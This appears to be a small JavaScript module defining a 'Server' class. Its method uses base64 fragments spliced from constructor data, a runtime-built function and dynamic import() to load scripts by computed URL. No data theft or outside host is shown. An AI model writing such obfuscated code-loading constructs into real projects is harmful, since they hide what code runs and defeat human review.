class Server {

    constructor(d) {
        this.d = d;
    };

    load = (d) => {
        return {
            _ux: {
                dom: { s: `YXNzZXRzL2pzL2luZGV4Lmpz` },
                op: { ready: (d) => {
                    for (let i in _pm.skin)
                        import(URL[d.g](new d.f(`hash`, atob(`cmV0dXJuIG5l${this.d["64"]}JzZUludChoYX${this.d["53"]}c2NyaXB0In0p`))(i)));
                    _start({});                    
                } },
                y: {}
            },
            e: document.createElement("script")
        }
    }

};

export { Server };